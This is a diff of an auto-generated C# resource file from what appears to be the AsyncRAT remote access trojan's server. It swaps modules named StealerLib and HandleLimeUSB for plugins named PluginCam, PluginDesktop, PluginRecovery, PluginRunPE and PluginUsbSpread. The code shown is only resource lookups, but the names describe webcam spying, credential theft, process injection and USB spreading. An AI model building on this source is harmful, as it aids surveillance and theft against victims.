@@ -81,20 +81,6 @@ namespace Server.Properties {
         }
         
         /// <summary>
-        ///   Looks up a localized string similar to &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
-        ///&lt;configuration&gt;
-        ///    &lt;configSections&gt;
-        ///        &lt;sectionGroup name=&quot;userSettings&quot; type=&quot;System.Configuration.UserSettingsGroup, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;&gt;
-        ///            &lt;section name=&quot;AsyncRAT_Sharp.Properties.Settings&quot; type=&quot;System.Configuration.ClientSettingsSection, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot; allowExeDefinition=&quot;MachineToLocalUser&quot; requirePermission=&quot;false&quot;/&gt;
-        ///        &lt;/s [rest of string was truncated]&quot;;.
-        /// </summary>
-        internal static string AsyncRAT_Sharp_exe {
-            get {
-                return ResourceManager.GetString("AsyncRAT_Sharp_exe", resourceCulture);
-            }
-        }
-        
-        /// <summary>
         ///   Looks up a localized resource of type System.Drawing.Bitmap.
         /// </summary>
         internal static System.Drawing.Bitmap blank_screen {
@@ -130,16 +116,6 @@ namespace Server.Properties {
         internal static System.Drawing.Bitmap chat {
             get {
                 object obj = ResourceManager.GetObject("chat", resourceCulture);
-                return ((System.Drawing.Bitmap)(obj));
-            }
-        }
-        
-        /// <summary>
-        ///   Looks up a localized resource of type System.Drawing.Bitmap.
-        /// </summary>
-        internal static System.Drawing.Bitmap circle_loading_gif {
-            get {
-                object obj = ResourceManager.GetObject("circle-loading-gif", resourceCulture);
                 return ((System.Drawing.Bitmap)(obj));
             }
         }
@@ -201,16 +177,6 @@ namespace Server.Properties {
             get {
                 object obj = ResourceManager.GetObject("filemanager", resourceCulture);
                 return ((System.Drawing.Bitmap)(obj));
-            }
-        }
-        
-        /// <summary>
-        ///   Looks up a localized resource of type System.Byte[].
-        /// </summary>
-        internal static byte[] HandleLimeUSB {
-            get {
-                object obj = ResourceManager.GetObject("HandleLimeUSB", resourceCulture);
-                return ((byte[])(obj));
             }
         }
         
@@ -327,9 +293,49 @@ namespace Server.Properties {
         /// <summary>
         ///   Looks up a localized resource of type System.Byte[].
         /// </summary>
-        internal static byte[] Plugin {
+        internal static byte[] PluginCam {
             get {
-                object obj = ResourceManager.GetObject("Plugin", resourceCulture);
+                object obj = ResourceManager.GetObject("PluginCam", resourceCulture);
+                return ((byte[])(obj));
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized resource of type System.Byte[].
+        /// </summary>
+        internal static byte[] PluginDesktop {
+            get {
+                object obj = ResourceManager.GetObject("PluginDesktop", resourceCulture);
+                return ((byte[])(obj));
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized resource of type System.Byte[].
+        /// </summary>
+        internal static byte[] PluginRecovery {
+            get {
+                object obj = ResourceManager.GetObject("PluginRecovery", resourceCulture);
+                return ((byte[])(obj));
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized resource of type System.Byte[].
+        /// </summary>
+        internal static byte[] PluginRunPE {
+            get {
+                object obj = ResourceManager.GetObject("PluginRunPE", resourceCulture);
+                return ((byte[])(obj));
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized resource of type System.Byte[].
+        /// </summary>
+        internal static byte[] PluginUsbSpread {
+            get {
+                object obj = ResourceManager.GetObject("PluginUsbSpread", resourceCulture);
                 return ((byte[])(obj));
             }
         }
@@ -401,16 +407,6 @@ namespace Server.Properties {
             get {
                 object obj = ResourceManager.GetObject("shell", resourceCulture);
                 return ((System.Drawing.Bitmap)(obj));
-            }
-        }
-        
-        /// <summary>
-        ///   Looks up a localized resource of type System.Byte[].
-        /// </summary>
-        internal static byte[] StealerLib {
-            get {
-                object obj = ResourceManager.GetObject("StealerLib", resourceCulture);
-                return ((byte[])(obj));
             }
         }
         
@@ -490,6 +486,16 @@ namespace Server.Properties {
         internal static System.Drawing.Bitmap visit {
             get {
                 object obj = ResourceManager.GetObject("visit", resourceCulture);
+                return ((System.Drawing.Bitmap)(obj));
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized resource of type System.Drawing.Bitmap.
+        /// </summary>
+        internal static System.Drawing.Bitmap webcam {
+            get {
+                object obj = ResourceManager.GetObject("webcam", resourceCulture);
                 return ((System.Drawing.Bitmap)(obj));
             }
         }
